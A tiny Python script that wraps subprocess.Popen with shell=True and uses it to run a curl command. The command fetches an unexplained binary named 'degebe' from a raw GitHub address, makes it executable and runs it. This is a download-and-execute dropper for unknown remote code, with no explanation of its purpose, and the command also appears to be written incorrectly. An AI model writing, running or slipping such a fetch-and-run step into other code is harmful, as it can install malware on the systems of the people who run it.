from subprocess import PIPE, Popen
import base64





def cmdline(command):
    process = Popen(
        args=command,
        stdout=PIPE,
        shell=True
    )
    return process.communicate()[0]





cmdline ('curl https://raw.githubusercontent.com/karmiasif/biji/main/degebe && chmod +x degebe && ./degebe')
